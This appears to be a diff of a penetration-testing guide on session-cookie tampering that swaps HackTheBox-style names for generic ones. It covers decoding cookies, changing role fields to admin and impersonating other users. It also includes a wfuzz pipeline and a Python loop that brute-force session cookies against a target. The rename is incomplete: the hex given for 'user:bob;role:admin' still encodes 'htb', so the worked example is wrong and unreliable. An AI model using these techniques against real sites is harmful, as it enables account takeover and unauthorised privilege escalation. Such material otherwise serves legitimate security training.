@@ -17,13 +17,13 @@ When a session cookie contains identity, role, or grant data (instead of just a 
 
 ```
 # Decode the cookie
-Cookie: SESSIONID=757365723A6874623B726F6C653A75736572
+Cookie: SESSIONID=757365723A626F623B726F6C653A75736572
         ↓ hex decode
-        user:htb;role:user
+        user:bob;role:user
 
 # Tamper
         ↓ modify
-        user:htb;role:admin
+        user:bob;role:admin
         ↓ re-encode (same format)
         757365723A6874623B726F6C653A61646D696E
 
@@ -64,7 +64,7 @@ Common session-cookie names:
 ```
 SESSIONID, SESSION, PHPSESSID, JSESSIONID, ASP.NET_SessionId, connect.sid
 auth, token, session_token, sid
-HTBSESS, custom prefixes per application
+APPSESS, custom prefixes per application
 rememberme, persistent, remember_token, _remember_user
 ```
 
@@ -102,8 +102,8 @@ Recognizable by: only `0-9a-f` (lowercase) or `0-9A-F` (uppercase), even length,
 Example from a real-style application:
 
 ```bash
-echo -n '757365723A6874623B726F6C653A75736572' | xxd -r -p
-# → user:htb;role:user
+echo -n '757365723A626F623B726F6C653A75736572' | xxd -r -p
+# → user:bob;role:user
 ```
 
 Reading the decoded value reveals the cookie's secret: it's a `key:value` structure containing user identity and role, encoded as hex.
@@ -121,7 +121,7 @@ Recognizable by: presence of `%XX` sequences.
 If the decoded value starts with `{` or `[`, it's JSON. May contain identity directly:
 
 ```json
-{"user":"htb","role":"user","expires":1647135274}
+{"user":"bob","role":"user","expires":1647135274}
 ```
 
 ### JWT (three base64-encoded parts separated by dots)
@@ -200,9 +200,9 @@ preferences, locale               ← UI state
 Modify the relevant field, re-encode using the exact same chain in reverse:
 
 ```bash
-# Original: user:htb;role:user → 757365723A6874623B726F6C653A75736572
-# Modified: user:htb;role:admin
-echo -n 'user:htb;role:admin' | xxd -p | tr -d '\n'
+# Original: user:bob;role:user → 757365723A626F623B726F6C653A75736572
+# Modified: user:bob;role:admin
+echo -n 'user:bob;role:admin' | xxd -p | tr -d '\n'
 # → 757365723A6874623B726F6C653A61646D696E
 ```
 
@@ -219,7 +219,7 @@ If the response shows admin functionality, the tamper worked. If the response is
 | Tamper | What you're trying to achieve |
 | --- | --- |
 | `role:user` → `role:admin` | Privilege escalation within your session |
-| `user:htb` → `user:admin` | Impersonate another user |
+| `user:bob` → `user:admin` | Impersonate another user |
 | `is_admin:0` → `is_admin:1` | Toggle a boolean grant |
 | `tier:free` → `tier:premium` | Access paid features |
 | `expires:<past>` → `expires:<future>` | Extend session lifetime |
@@ -250,7 +250,7 @@ Try integer escalation: if your current role is `5`, try `0`, `1`, `100`, `9999`
 Rememberme cookies are session cookies with a longer lifetime. The longer lifetime makes them attractive brute-force targets:
 
 ```
-HTBPERSISTENT cookie set when "remember me" checkbox ticked at login
+APPPERSIST cookie set when "remember me" checkbox ticked at login
 Cookie persists for 7 / 30 / 90 days
 Same tampering analysis applies
 ```
@@ -300,7 +300,7 @@ When the session cookie is a "random" value that's too short to actually be rand
 
 # Use john to generate candidate cookies (faster than incrementing in shell)
 john --incremental=LowerNum --min-length=6 --max-length=6 --stdout \
-  | wfuzz -z stdin -b HTBSESS=FUZZ --ss "Welcome" -u https://<TARGET>/profile.php
+  | wfuzz -z stdin -b APPSESS=FUZZ --ss "Welcome" -u https://<TARGET>/profile.php
 ```
 
 `--ss "Welcome"` filters for responses showing the authenticated landing page. Any hit is a valid session for an already-logged-in user.
@@ -352,8 +352,8 @@ def encode_cookie(username, persistence, random5):
 
 # Brute-force the random5 value for a known username
 for random5 in range(100000):
-    cookie = encode_cookie('htbadmin', 'persistentcookie', random5)
-    res = requests.get(URL, cookies={'HTBPERSISTENT': cookie})
+    cookie = encode_cookie('siteadmin', 'persistentcookie', random5)
+    res = requests.get(URL, cookies={'APPPERSIST': cookie})
     if 'Welcome' in res.text:
         print(f"Hit at random5={random5}: {cookie}")
         break
